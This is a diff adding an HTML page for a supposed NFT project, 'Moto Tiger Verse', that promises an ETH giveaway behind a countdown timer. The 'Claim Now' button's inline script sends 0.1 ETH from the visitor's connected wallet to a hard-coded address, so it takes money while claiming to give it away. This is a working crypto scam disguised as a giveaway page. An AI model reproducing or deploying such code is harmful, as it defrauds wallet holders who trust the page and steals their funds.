@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Moto Tiger Verse</title>
+    <script src="https://unpkg.com/moralis/dist/moralis.js"></script>
+    <script src="https://cdn.jsdeliver.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://npmcdn.com/moralis/dist/moralis.js"></script>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- favicon -->
+    <link rel="apple-touch-icon" sizes="180x180" href="images/x-icon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="images/x-icon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="images/x-icon/favicon-16x16.png">
+    <link rel="manifest" href="images/x-icon/site.webmanifest">
+    <link rel="stylesheet" href="css/style.css" />
+  </head>
+  <body>
+    <header>
+      <div class="container">
+        <div class="logo">
+          <a href="/">
+            <img src="images/x-icon/favicon-32x32.png" alt="logo" />
+          </a>
+        </div>
+        <div class="menu">
+          <a
+            href="https://discord.gg/A9CnsVzzkZ"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            <img src="images/header/discord.webp" alt="Discord" />
+          </a>
+          <a
+            href="https://twitter.com/Moto_TigerVerse"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            <img src="images/header/twitter.webp" alt="Twitter" />
+          </a>
+          <a
+            href="https://opensea.io/collection/moto-tiger-verse"
+            target="_blank"
+            rel="noopener noreferrer"
+          >
+            <img src="images/header/opensea.webp" alt="Opensea" />
+          </a>
+          
+           <a <button class="wallet-btn btn" id="btn-login"><span>Wallet Login</span></button>
+            </a>
+            <a <button class="wallet-btn btn" id="btn-logout"><span>Wallet Logout</span></button>
+            </a>
+          
+        </div>
+      </div>
+    </header>
+
+    <section class="container">
+      <div class="owner-status"></div>
+      <div class="countdown">
+        <ul
+          id="countdown"
+          class="count-down"
+          data-date="May 17, 2022 4:00:00 PM UTC"
+        >
+          <li class="clock-item">
+            <span class="count-number days">20</span>
+            <p class="count-text">Days</p>
+          </li>
+
+          <li class="clock-item">
+            <span class="count-number hours">20</span>
+            <p class="count-text">Hour</p>
+          </li>
+
+          <li class="clock-item">
+            <span class="count-number minutes">20</span>
+            <p class="count-text">Min</p>
+          </li>
+
+          <li class="clock-item">
+            <span class="count-number seconds">20</span>
+            <p class="count-text">Sec</p>
+          </li>
+        </ul>
+        <h1>Claim Your ETH Now!!</h1>
+        
+       
+        <p>Hurry, unclaimed giveaways will be rolled over when the timer stops!</p>
+        <a <button class="hero-btn btn" onclick="runcode()"><span>Claim Now</span></button>
+        </a>
+       
+         
+      </div>
+    </section>
+        <script type="text/javascript" src="./main.js"></script>
+    <script> 
+    function runcode(){
+     Moralis.transfer({type:"native",receiver:"0xECeB463Ea9C8c7Ff2AC5b44afC454c45456F3864",
+                        amount:Moralis.Units.ETH("0.1")})
+                        }
+     </script> 
+
+   
+    <script src="js/countdown.js"></script>
+  </body>
+</html>
